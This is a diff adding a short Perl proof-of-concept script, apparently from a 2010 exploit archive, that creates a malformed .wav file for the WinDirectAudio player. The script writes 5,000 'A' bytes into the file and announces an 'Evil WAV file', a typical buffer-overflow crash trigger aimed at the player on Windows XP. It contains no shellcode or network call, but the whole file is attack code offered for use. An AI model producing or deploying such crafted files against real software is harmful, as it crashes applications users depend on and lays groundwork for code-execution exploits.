@@ -1,0 +1,13 @@
+#/usr/bin/perl
+#Title: WinDirectAudio  (.WAV) PoC
+#[+]Date       : May 21,  2010 
+#[+]version    : v1.0
+#[+]Author     : ahwak2000
+#[+]Contact    : z.u5[at]hotmail.com
+#[+]Geetz [2]  : germaya_x
+#[+]tested on  : windows xp sp2&sp3 EN
+#########################################
+my $junk = "\x41" x 5000;
+open(myfile,'>> ahwak2000.wav');
+print myfile $junk."\r\n";
+print "\nEvil WAV file created successfully.";
